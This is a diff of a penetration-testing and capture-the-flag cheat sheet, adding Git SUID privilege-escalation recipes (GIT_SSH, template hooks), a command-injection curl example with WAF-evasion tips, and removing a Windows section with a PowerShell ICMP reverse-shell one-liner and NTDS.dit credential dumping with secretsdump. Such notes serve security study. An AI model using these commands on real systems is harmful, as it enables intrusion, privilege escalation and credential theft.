+
+  steghide version 0.5.1
+
+  the first argument must be one of the following:
+  embed, --embed          embed data
+  extract, --extract      extract data
+  info, --info            display information about a cover- or stego-file
+  info <filename>       display information about <filename>
+  encinfo, --encinfo      display a list of supported encryption algorithms
+  version, --version      display version information
+  license, --license      display steghide's license
+  help, --help            display this usage information
+
+.. Tip :: Sometimes, there is no password, so just press enter.
+
+Git client Privilege Escalation
+--------------------------------
+Git clients (before versions 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1) and Mercurial clients (before version 3.2.3) contained three vulnerabilities that allowed malicious Git or Mercurial repositories to execute arbitrary code on vulnerable clients under certain circumstances. Refer `12 Days of HaXmas: Exploiting CVE-2014-9390 in Git and Mercurial <https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial>`_
+
+In one of write-up, `Nicolas Surribas <http://devloop.users.sourceforge.net/>`_ has mentioned about two git environment variables GIT_SSH and GIT_TEMPLATE which can be utilized to do privilege escalation if git clone is performed using a suid binary. Imagine a suid binary utilized to do git clone from a remote directory.
+
+GIT_SSH
+^^^^^^^
+
+If either (GIT_SSH or GIT_SSH_COMMAND) of these environment variables is set then git fetch and git push will use the specified command instead of ssh when they need to connect to a remote system. The command will be given exactly two or four arguments: the username@host (or just host) from the URL and the shell command to execute on that remote system, optionally preceded by -p (literally) and the port from the URL when it specifies something other than the default SSH port. $GIT_SSH_COMMAND takes precedence over $GIT_SSH, and is interpreted by the shell, which allows additional arguments to be included.  $GIT_SSH on the other hand must be just the path to a program (which can be a wrapper shell script, if additional arguments are needed).
+
+::
+
+  echo '#!/bin/bash' > cmd
+  echo 'cp /root/flag.txt /tmp' >> cmd
+  echo 'chmod 777 /tmp/flag.txt' >> cmd
+  GIT_SSH=/home/username/cmd ./setuidbinary(utilizing git clone/ git fetch)
+
+  or
+
+  echo 'chown root:root /home/username/priv ; chmod 4755 /home/username/priv' > ssh
+
+  where priv is binary compiled from suid.c
+
+This basically changes the command from
+
+::
+
+  trace: built-in: git 'clone' 'ssh://root@machine-dev:/root/secret-project' '/mnt/secret-project/'
+
+to
+
+::
+
+  trace: run_command: '/home/user/ssh' 'root@machine-dev' 'git-upload-pack '\''/root/secret-project'\'''
+
+GIT_TEMPLATE_DIR
+^^^^^^^^^^^^^^^^^
+Files and directories in the template directory whose name do not start with a dot will be copied to the $GIT_DIR after it is created. Refer `Git-init <https://git-scm.com/docs/git-init>`_ 
+
+::
+
+  cp -r /usr/share/git-core/templates/ mytemplates
+  cd mytemplates/hooks
+  echo '#!/bin/bash' > post-checkout
+  echo 'cp /root/flag /tmp/flag2' >> post-checkout
+  echo 'chown username.username /tmp/flag2' >> post-checkout
+  chmod +x post-checkout
+  cd ../..
+  GIT_TEMPLATE_DIR=/home/username/mytemplates/ ./setuidbinary( utilizing git clone/ git fetch)
+
+
+Metasploit shell upgrade
+------------------------
+
+In metasploit framework, if we have a shell ( you should try this also, when you are trying to interact with a shell and it dies (happened in a VM), we can upgrade it to meterpreter by using sessions -u
+
+:: 
+
+   sessions -h
+   Usage: sessions [options]
+   
+   Active session manipulation and interaction.
+
+   OPTIONS:
+
+   -u <opt>  Upgrade a shell to a meterpreter session on many platforms
+
+
+
 Truecrypt Files
 ---------------
 
@@ -2742,187 +3200,10 @@ and Veracrypt or cryptsetup to open the file.
 
   cryptsetup open --type tcrypt <Truecrypt> <MountName>
 
-Windows
--------
 
-Get-ChildItem Mode Values
-^^^^^^^^^^^^^^^^^^^^^^^^^
 
-'Mode' values returned by PowerShell's Get-ChildItem cmdlet?
-
-::
-
- PS> gci|select mode,attributes -u
-
- Mode                Attributes
- ----                ----------
- d-----               Directory
- d-r---     ReadOnly, Directory
- d----l Directory, ReparsePoint
- -a----                 Archive
-
-In any case, the full list is:
-
-::
-
- d - Directory
- a - Archive
- r - Read-only
- h - Hidden
- s - System
- l - Reparse point, symlink, etc.
-
-Zip or unzip using ONLY Windows' built-in capabilities? 
-^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-
-Powershell way
-
-::
-
- Add-Type -A System.IO.Compression.FileSystem
- [IO.Compression.ZipFile]::CreateFromDirectory('foo', 'foo.zip')
- [IO.Compression.ZipFile]::ExtractToDirectory('foo.zip', 'bar')
-
-Alternate Data Stream
-^^^^^^^^^^^^^^^^^^^^^
-Sometimes, `Alternate Data Stream <https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/>`_ can be used to hide data in streams.
-
-The output shows not only the name of the ADS and its size, but also the unnamed data stream and its size is also listed (shown as :$DATA).
-
-Powershell-Way
-
-::
-
- PS > Get-Item -Path C:\Users\Administrator\example.zip -stream *
-
- Filename: C:\Users\Administrator\example.zip
-
- Stream             Length
- ------             -------
- :$DATA             8
- pass.txt           4
-
-Now, we know the name of the ADS, We can use the Get-Content cmdlet to query its contents.
-
-::
-
- Get-Content -Path C:\Users\Administrator\example.zip -Stream pass.txt
- The password is Passw0rd!
-
-Check a directory for ADS?
-
-::
-
- gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'
-
-DIR Way
-
-Current directory ADS Streams
-
-::
-
- dir /r | find ":$DATA"
-
-Sub-directories too
-
-::
-
- dir   /s /r | find ":$DATA"
-
-Reading the hidden stream
-
-::
-
- more < testfile.txt:hidden_stream::$DATA
-
-Redirecting Standard Out and Standard Error from PowerShell Start-Process
-^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-
-Often reverse shells will not display standard error. Sometimes they will not display standard out when a new process is started. The following will redirect standard out and standard error to text files when PowerShell starts a new process.
-
-::
-
- PS C:\> Start-Process -FilePath C:\users\administrator\foo.txt -NoNewWindow -PassThru -Wait -RedirectStandardOutput stdout.txt -RedirectStandardError stderr.txt
-
-`Powershell Start-Process Module Documentation <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process>`_.
-
-
-NTDS.dit and SYSTEM hive
-^^^^^^^^^^^^^^^^^^^^^^^^^
-
-If you have found files such as 
-
-::
-
- 192.168.110.133_psexec.ntdsgrab._333512.dit: Extensible storage engine DataBase, version 0x620, checksum 0x16d44752, page size 8192, DirtyShutdown, Windows version 6.1
- 192.168.110.133_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above
-
-Probably, there are dump of domain controller NTDS.dit file, from which passwords can be extracted. Utilize,
-
-::
-
- python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL
-
-ICMP Shell
-^^^^^^^^^^
-
-Sometimes, inbound and outbound traffic from any port is disallowed and only ICMP traffic is allowed. In that case, we can use `Simple reverse ICMP Shell <https://github.com/inquisb/icmpsh>`_ However, this requires the executable to be present on the system. There's a powershell version of `ICMP Reverse Shell <https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1>`_ Sometimes, probably, we can execute powershell code on the machine. In that case, we can use the one-liner powershell code to execute the shell.
-
-::
-
- powershell -nop -c "$ip='your_ip'; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment = $true; $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes('OK'), $po); while ($true) { $ry = $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes(''), $po); if ($ry.Buffer) { $rs = ([text.encoding]::ASCII).GetString($ry.Buffer); $rt = (Invoke-Expression -Command $rs | Out-String ); $ic.Send($ip,60*1000,([text.encoding]::ASCII).GetBytes($rt),$po); } }"
-
-
-The above code is basically a reduced version of the powershell version of ICMP and have a limited buffer (which means commands whose output is greater than the buffer, won't be displayed!). Now, there's a painful way of transferring files to the victim system which is
-
-* Convert the file/ code which needs to be transferred in to base64. (If possible, remove all the uncessesary code/ comments, this would help us to reduce the length of the base64)
-* Utilize the `Add-Content cmdlet <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-5.1>`_ to transfer the file to the victim system. Do, remember to transfer the data in chunks as we have limited buffer! Probably, we have to run the below command twice or thrice to transfer the whole base64-encoded chunk.
- 
- ::
-  
-  Add-Content <filename> "Base64 encoded content"
-
-* Once the base64-encoded data is transferred, we can utilize `certutil <https://technet.microsoft.com/en-us/library/cc732443(v=ws.11).aspx>`_ from Microsoft to decode the base64-encoded to normal file.
-
- ::
-
-  certutil <-decode/ -encode> <input file> <output file>
-  -decode Decode a Base64-encoded file
-  -encode Encode a file to Base64
-
-* Now, we can execute the file (assuming powershell ps1 file) to get the full powershell ICMP reverse shell with buffer managment so, we would be able to get full output of the commands.
-
-* Now, most of the time after getting the intial shell, probably, we would have figured out user credentials ( let's say from www-data or iisapppool user to normal/ admin user credentials. ) At this point of time, we can use the below code to create a PSCredential.
-
- ::
-
-  $username = 'UsernameHere';
-  $password = 'PasswordHere';
-  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
-  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword 
-
-* Once, we have created a PSCredential, we can use `Invoke-Command <https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command>`_  to execute command as that user.
-
-  ::
    
-   Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {Command to be executed}
-   -ComputerName localhost is required as the code is to be executed on localhost, without -ComputerName, InvokeCommand doesn't work.
-
-* Possibly, we can execute the ICMP Shell code to get the shell as the new user.
-
-* One problem, which we gonna face is, when we are running ICMP Shell with different users for example, first with IISWebpool, then with User1, then with user2, we would get multple times IISWebpool as that powershell process (on UDP) is still running. One way to this is Just before launching a new ICMP shell as a different user. 
-  
-  * Check powershell processes with Show-Process
-
-   ::
-
-    Show-Process -Name *power* "
-  
-  *  Note down  the PID 
-  * Execute shell as the different user 
-  * Stop-Process the previous PID
-
-
+ 
 Grep in input box?
 ------------------
 
@@ -3161,7 +3442,7 @@ Others
  * If you do get the configuration file, do check for what kind of proxy it is! like SOCKS4, SOCKS5 or HTTP(S) proxy and is there any authentication required to access the proxy. 
  * We may utilize `Proxychains <https://github.com/haad/proxychains>`_ to access the other side of network like ssh, http etc. 
 
-* Running Asterisk/ Elastix/ FreePBX or any PBX, probably try `SIPVicious <https://github.com/EnableSecurity/sipvicious>`_  suite is a set of tools that can be used to audit SIP based VoIP systems. Running http:\\IP\panel should provide us valid extensions.
+* Running Asterisk/ Elastix/ FreePBX or any PBX, probably try `SIPVicious <https://github.com/EnableSecurity/sipvicious>`_  suite is a set of tools that can be used to audit SIP based VoIP systems. Running "http:\\IP\panel" should provide us valid extensions.
 
 * Sharepoint running? Probably, check `SPartan <https://github.com/sensepost/SPartan>`_ Frontpage and Sharepoint fingerprinting and attack tool and `SharePwn <https://github.com/0rigen/SharePwn>`_ SharePoint Security Auditor.
 
@@ -3169,7 +3450,7 @@ Others
 
 * Mostly, if there's only port open like ssh and the IP might be acting as a interface between two networks? Like IT and OT. Probably, try to add that IP address as a default route? As it might be acting as a router?
 
-* If you are trying to figure out the hostname of the machine and the DNS-Server is not configured, may be try to do a Full Nmap Scan -A Option? (Still need to figure out how does that work:)
+* If you are trying to figure out the hostname of the machine and the DNS-Server is not configured, may be try to do a Full Nmap Scan -A Option? (Still need to figure out how does that work)
 
 * Want to send a email via the SMTP server something like SMTP-Open-Relay utilize `Swaks <http://www.jetmore.org/john/code/swaks/>`_ Swiss Army Knife for SMTP.
 
@@ -3271,6 +3552,20 @@ Others
 
    echo "`ps aux --sort -rss`"
 
+* If there's a XXE on a website and possible RFI using internal address i.e on http://127.0.0.1:80/home=RFI rather than http://10.10.10.10:80/home=RFI, utilize XXE to send the request with localaddress.
+
+* If there's a possible command execution on a website such as 
+
+  ::
+
+   curl -A "bitvijays" -i "http://IPAddress/example?parameter=' whoami'"
+
+  However, it is protected by a WAF, probably, try bash globbling techniques with ? and \*. Refer `Web Application Firewall (WAF) Evasion Techniques <https://medium.com/secjuice/waf-evasion-techniques-718026d693d8>`_
+  Also, it might be a good idea to test the command with ? on your local machine first then directly on the target.
+
+* Similar to ls there is dir in linux. Try "dir -l" Might be helpful sometimes.
+
+* Sometimes, we don't have tools on the victim machine, in that case we can download static binaries from `Static-Binaries <https://github.com/andrew-d/static-binaries>`_ If not, found, try the deb or rpm package of the binary, extract it and upload.
 
 * Handy Stuff
 
@@ -3622,8 +3917,8 @@ Email Server
 
 .. _A2-File-Upload:
 
-Appendix-II File Upload
-=======================
+Appendix-II : File Upload
+=========================
 
 Examples
 --------
